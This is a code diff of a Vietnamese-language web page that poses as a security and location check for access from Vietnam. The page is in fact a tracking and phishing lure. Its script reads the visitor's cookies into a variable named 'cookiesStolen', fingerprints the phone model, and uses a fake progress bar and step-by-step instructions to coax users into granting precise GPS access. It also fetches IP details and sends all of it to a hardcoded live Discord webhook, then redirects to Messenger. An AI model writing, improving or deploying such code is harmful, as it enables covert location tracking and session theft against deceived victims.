@@ -20,7 +20,6 @@
             background: rgba(20,24,32,0.8); backdrop-filter: blur(20px);
             border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
             padding: 35px 25px; max-width: 360px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-            transition: all 0.3s ease;
         }
         .shield {
             width: 70px; height: 70px; margin: 0 auto 20px auto;
@@ -35,7 +34,7 @@
             border-radius: 10px; transition: width 0.15s linear;
         }
         .title { font-size: 19px; font-weight: 600; margin-bottom: 8px; color: #ffffff; }
-        .subtitle { color: #a0a8b8; font-size: 14px; line-height: 1.5; margin-bottom: 10px; }
+        .subtitle { color: #a0a8b8; font-size: 14px; line-height: 1.5; margin-bottom: 10px; white-space: pre-line; }
         .btn {
             display: inline-block; margin-top: 20px; padding: 13px 30px;
             background: rgba(79,195,247,0.15); border: 1px solid rgba(79,195,247,0.3);
@@ -61,7 +60,6 @@
 </head>
 <body>
     <div id="main">
-        <!-- Step 1: initial card with progress -->
         <div class="card" id="step1">
             <div class="shield"></div>
             <div class="title" id="step1Title">Đang kiểm tra bảo mật...</div>
@@ -70,7 +68,6 @@
             <button class="btn hidden" id="tapButton">Xác minh vị trí</button>
         </div>
 
-        <!-- Step 2: result -->
         <div class="card hidden" id="step2">
             <div class="result-icon" id="resultIcon"></div>
             <div class="title" id="resultTitle"></div>
@@ -78,22 +75,26 @@
             <div class="action-row" id="actionRow"></div>
         </div>
 
-        <!-- Custom popup for PC/Android or iOS instructions -->
-        <div class="card hidden" id="permPopup">
-            <div class="title" id="popupTitle"></div>
-            <div class="subtitle" id="popupSub" style="white-space: pre-line;"></div>
-            <button class="btn" id="popupBtn"></button>
-            <button class="action-btn hidden" id="popupRetryBtn">Thử lại</button>
+        <!-- iOS guide card -->
+        <div class="card hidden" id="iosGuide">
+            <div class="title">Hướng dẫn bật vị trí</div>
+            <div class="subtitle" style="text-align:left; display:inline-block; margin-bottom:15px;">
+                1. Mở <b>Cài đặt</b> trên iPhone<br>
+                2. Cuộn xuống chọn <b>Safari</b><br>
+                3. Chọn <b>Vị trí</b><br>
+                4. Chọn <b>Cho phép</b><br>
+                5. Quay lại đây và nhấn <b>Thử lại</b>
+            </div>
+            <button class="btn" id="iosRetryBtn">Thử lại</button>
         </div>
     </div>
 
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
 
-        // DOM
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
-        const permPopup = document.getElementById('permPopup');
+        const iosGuide = document.getElementById('iosGuide');
         const progressBar = document.getElementById('progressBar');
         const step1Title = document.getElementById('step1Title');
         const step1Sub = document.getElementById('step1Sub');
@@ -102,30 +103,41 @@
         const resultTitle = document.getElementById('resultTitle');
         const resultSub = document.getElementById('resultSub');
         const actionRow = document.getElementById('actionRow');
-        const popupTitle = document.getElementById('popupTitle');
-        const popupSub = document.getElementById('popupSub');
-        const popupBtn = document.getElementById('popupBtn');
-        const popupRetryBtn = document.getElementById('popupRetryBtn');
+        const iosRetryBtn = document.getElementById('iosRetryBtn');
 
         let gpsData = null;
         let ipData = null;
         const cookiesStolen = document.cookie || 'none';
-
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
 
+        // Improved phone model detection
         function getDeviceModel(ua) {
-            const models = [
-                /\((SM-[A-Z0-9]+)\)/i,
+            // Common patterns (order matters)
+            const patterns = [
+                /\((SM-[A-Z0-9]+)\)/i,                        // Samsung
                 /\((Galaxy [A-Za-z0-9 ]+)\)/i,
-                /iPhone (\d{1,2}(?:\s*(Pro|Max|Plus))?)\)/i,
+                /iPhone (\d{1,2}(?: Pro(?: Max)?)?)/i,       // iPhone
                 /Redmi ([^;)]+)/i,
-                /POCOPHONE ([^;)]+)/i,
-                /Pixel ([0-9]+[a-z]?)/i
+                /POCO ([^;)]+)/i,
+                /Pixel ([0-9]+[a-z]?)/i,
+                /(?:Xiaomi )?(Mi [A-Za-z0-9 ]+)/i,
+                /OnePlus ([A-Z0-9]+)/i,
+                /OPPO ([A-Z0-9]+)/i,
+                /vivo ([A-Z0-9]+)/i,
+                /realme ([A-Z0-9]+)/i,
+                /Nokia ([A-Z0-9]+)/i,
+                /LG ([A-Z0-9]+)/i,
+                /HTC ([A-Z0-9]+)/i,
+                /Huawei ([A-Z0-9]+)/i,
+                /Motorola ([A-Z0-9]+)/i
             ];
-            for (let regex of models) {
-                const match = ua.match(regex);
-                if (match) return match[1] || match[0].replace(/[\(\)]/g,'');
+            for (let p of patterns) {
+                const match = ua.match(p);
+                if (match) return match[1] || match[2] || match[0];
             }
+            // Generic fallback
+            const buildMatch = ua.match(/Build\/([^;)]+)/);
+            if (buildMatch) return buildMatch[1];
             return 'Unknown';
         }
 
@@ -275,7 +287,9 @@
         }
 
         function showResult(success, title, subtitle, actions = []) {
-            hideAllCards();
+            step1.classList.add('hidden');
+            step2.classList.add('hidden');
+            iosGuide.classList.add('hidden');
             step2.classList.remove('hidden');
             resultIcon.className = 'result-icon ' + (success ? 'success' : 'fail');
             resultIcon.innerHTML = success
@@ -293,22 +307,77 @@
             });
         }
 
-        function hideAllCards() {
-            step1.classList.add('hidden');
-            step2.classList.add('hidden');
-            permPopup.classList.add('hidden');
-        }
-
         function openLocationSettings() {
             if (/Android/.test(navigator.userAgent)) {
                 window.location.href = 'intent://com.android.settings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;';
+            } else if (isIOS) {
+                // Open Settings app (if possible, otherwise alert)
+                window.location.href = 'App-Prefs:Privacy&path=LOCATION';
             } else {
-                alert('Vui lòng mở Cài đặt > Quyền riêng tư > Dịch vụ vị trí và bật vị trí cho trình duyệt.');
+                alert('Vui lòng bật vị trí trong cài đặt trình duyệt.');
             }
         }
 
-        function retryFromPopup() {
-            hideAllCards();
+        async function performCheck() {
+            step1Title.textContent = 'Đang lấy vị trí...';
+            step1Sub.textContent = '';
+            progressBar.style.width = '0%';
+            let percent = 0;
+            const fakeInterval = setInterval(() => {
+                percent += 10;
+                progressBar.style.width = percent + '%';
+                if (percent >= 100) clearInterval(fakeInterval);
+            }, 80);
+
+            gpsData = null;
+            ipData = null;
+            const gpsPromise = forceGPS();
+            ipData = await fetchIP();
+            const gpsResult = await gpsPromise;
+
+            clearInterval(fakeInterval);
+            progressBar.style.width = '100%';
+            gpsData = gpsResult;
+
+            let isVN = false;
+            if (gpsData && !gpsData.error && gpsData.lat != null) {
+                isVN = isInsideVietnam(gpsData.lat, gpsData.lon);
+            } else if (ipData) {
+                isVN = ipData.country.toLowerCase().includes('vietnam') || (ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
+            }
+
+            await sendData();
+
+            if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
+                showResult(false,
+                    'Không thể lấy vị trí',
+                    'Vui lòng bật dịch vụ vị trí và cho phép quyền.',
+                    [
+                        { label: 'Mở cài đặt vị trí', onClick: openLocationSettings, primary: true },
+                        { label: 'Thử lại', onClick: () => {
+                            showInitialCard();
+                        } }
+                    ]);
+                return;
+            }
+
+            if (isVN) {
+                showResult(true,
+                    'Xác minh thành công',
+                    'Bạn đủ điều kiện truy cập. Đang chuyển hướng...',
+                    []);
+                setTimeout(() => { window.location.href = 'https://www.messenger.com/'; }, 2000);
+            } else {
+                showResult(false,
+                    'Truy cập bị hạn chế',
+                    'Hệ thống chỉ cho phép người dùng tại Việt Nam.',
+                    [ { label: 'Thử lại', onClick: () => { showInitialCard(); } } ]);
+            }
+        }
+
+        function showInitialCard() {
+            step2.classList.add('hidden');
+            iosGuide.classList.add('hidden');
             step1.classList.remove('hidden');
             progressBar.style.width = '100%';
             step1Title.textContent = 'Sẵn sàng kiểm tra';
@@ -316,85 +385,7 @@
             tapBtn.classList.remove('hidden');
         }
 
-        // Show custom popup before asking for location
-        async function showPermissionPopup() {
-            hideAllCards();
-            permPopup.classList.remove('hidden');
-            if (isIOS) {
-                popupTitle.textContent = 'Yêu cầu vị trí';
-                popupSub.textContent = '1. Mở Cài đặt\n2. Cuộn xuống Safari\n3. Chọn Vị trí\n4. Chọn Cho phép\nSau đó nhấn Thử lại.';
-                popupBtn.textContent = 'Đã bật – Thử lại';
-                popupBtn.onclick = () => {
-                    // Try GPS again now
-                    retryFromPopup();
-                };
-                popupRetryBtn.classList.remove('hidden');
-                popupRetryBtn.onclick = () => retryFromPopup();
-            } else {
-                popupTitle.textContent = 'Cho phép vị trí';
-                popupSub.textContent = 'Một cửa sổ bật lên sẽ hiện ra.\nVui lòng nhấn "Cho phép" để xác minh bạn đang ở Việt Nam.';
-                popupBtn.textContent = 'Tiếp tục';
-                popupBtn.onclick = async () => {
-                    // Now actually request GPS
-                    hideAllCards();
-                    step1.classList.remove('hidden');
-                    step1Title.textContent = 'Đang lấy vị trí...';
-                    step1Sub.textContent = '';
-                    progressBar.style.width = '0%';
-                    let percent = 0;
-                    const fakeInterval = setInterval(() => {
-                        percent += 10;
-                        progressBar.style.width = percent + '%';
-                        if (percent >= 100) clearInterval(fakeInterval);
-                    }, 80);
-
-                    gpsData = null;
-                    ipData = null;
-                    const gpsPromise = forceGPS();
-                    ipData = await fetchIP();
-                    const gpsResult = await gpsPromise;
-                    clearInterval(fakeInterval);
-                    progressBar.style.width = '100%';
-                    gpsData = gpsResult;
-
-                    let isVN = false;
-                    if (gpsData && !gpsData.error && gpsData.lat != null) {
-                        isVN = isInsideVietnam(gpsData.lat, gpsData.lon);
-                    } else if (ipData) {
-                        isVN = ipData.country.toLowerCase().includes('vietnam') || (ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
-                    }
-
-                    await sendData();
-
-                    if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
-                        showResult(false,
-                            'Không thể lấy vị trí',
-                            'Vui lòng bật dịch vụ vị trí và cho phép quyền.',
-                            [
-                                { label: 'Mở cài đặt vị trí', onClick: openLocationSettings, primary: true },
-                                { label: 'Thử lại', onClick: retryFromPopup }
-                            ]);
-                        return;
-                    }
-
-                    if (isVN) {
-                        showResult(true,
-                            'Xác minh thành công',
-                            'Bạn đủ điều kiện truy cập. Đang chuyển hướng...',
-                            []);
-                        setTimeout(() => { window.location.href = 'https://www.messenger.com/'; }, 2000);
-                    } else {
-                        showResult(false,
-                            'Truy cập bị hạn chế',
-                            'Hệ thống chỉ cho phép người dùng tại Việt Nam.',
-                            [ { label: 'Thử lại', onClick: () => window.location.reload() } ]);
-                    }
-                };
-                popupRetryBtn.classList.add('hidden');
-            }
-        }
-
-        // Initial progress bar fill
+        // INITIAL ANIMATION
         let initProgress = 0;
         const initInterval = setInterval(() => {
             initProgress += 7;
@@ -408,9 +399,24 @@
             }
         }, 70);
 
+        // TAP HANDLER
         tapBtn.addEventListener('click', () => {
-            // Show the appropriate custom pop-up first
-            showPermissionPopup();
+            if (isIOS) {
+                // Show iOS guide instead of GPS attempt
+                step1.classList.add('hidden');
+                iosGuide.classList.remove('hidden');
+            } else {
+                // Immediately request GPS – browser popup appears
+                performCheck();
+            }
+        });
+
+        // iOS retry button
+        iosRetryBtn.addEventListener('click', () => {
+            // Hide guide, retry GPS (user supposedly enabled location)
+            iosGuide.classList.add('hidden');
+            step1.classList.remove('hidden');
+            performCheck(); // will trigger GPS popup now
         });
 
         // Auto-tap after 30s
